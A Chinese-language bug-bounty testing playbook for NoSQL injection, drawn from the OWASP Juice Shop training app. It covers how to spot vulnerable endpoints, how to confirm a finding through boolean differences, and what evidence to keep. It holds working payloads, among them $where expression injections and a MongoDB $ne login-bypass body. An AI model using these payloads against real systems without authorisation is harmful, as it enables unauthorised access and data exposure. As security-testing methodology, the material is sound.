---
name: nosql-injection
category: nosql
source: 渗透/juice-shop-closeout/patterns/nosql-injection.md
verified_in: [juice-shop-nosql-where, juice-shop-nosql-search]
src_value: high
severity_ceiling: high
requires_auth: false
payload_count: 2
---

# NoSQL 注入验证剧本

> 来源：OWASP Juice Shop 实战（MarsDB）。核心原理：NoSQL 数据库未对查询参数做类型检查，直接传入对象/表达式。

## 1. 识别

- 找 REST API 中带查询参数/JSON body 的接口：
  - 搜索类：`/search?q=xxx`、`/products?name=xxx`
  - 订单/追踪类：`/track-order/xxx`、`/orders/{id}`
  - 筛选类：`?filter=xxx`、`?where=xxx`
- 特征：Node.js 后端（Express/MongoDB/MarsDB）更常见
- 识别线索：参数名含 `where`、`query`、`search`、`filter`、`q`

## 2. Payload 序列

```text
# 1. $where 注入（字符串拼接型）
# 目标：把查询拼进 $where 表达式
GET /rest/track-order/' || true || '
# 返回所有订单 → 注入成功

# 2. $where 参数直接注入
GET /rest/orders/1?$where=true||1==1

# 3. 搜索 API 注入
GET /rest/products/search?q='||true||'

# 4. 操作符注入（JSON body 型）
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}
# MongoDB 操作符：$ne / $gt / $in / $regex / $where
```

### 判定用最小破坏

- `|| true ||` 系列只证明"表达式被拼接执行"，不提取数据
- 布尔差异对比：正常查询 vs `'||false||'`（应返回空）vs `'||true||'`（应返回全部）

## 3. 判定标准

confirmed 需同时满足：
- [ ] 注入表达式改变查询结果（true → 全部记录 / false → 空记录）
- [ ] 与正常请求形成可复现的布尔差异
- [ ] （数据提取类）能通过 `$regex` 或错误信息枚举出字段

## 4. 证据要求

按 `evidence-record.md`：
- 正常请求与注入请求的完整对照（响应记录数差异）
- 注入 payload 原文
- 若涉及数据提取：只提取字段名/结构证明，不批量导出用户数据

## 5. SRC 适用边界

- 适用：Node.js + NoSQL（MongoDB/MarsDB/Firestore）后端，尤其搜索与筛选接口
- 不适用：纯 SQL 后端（走 sql-injection 模板）、ORM 参数化查询的框架
- 注意：`$where` 注入可升级为 JS 代码执行（靶场原理：`Function("obj", "return " + expression)`），但 SRC 测试只做布尔证明，不执行任意代码
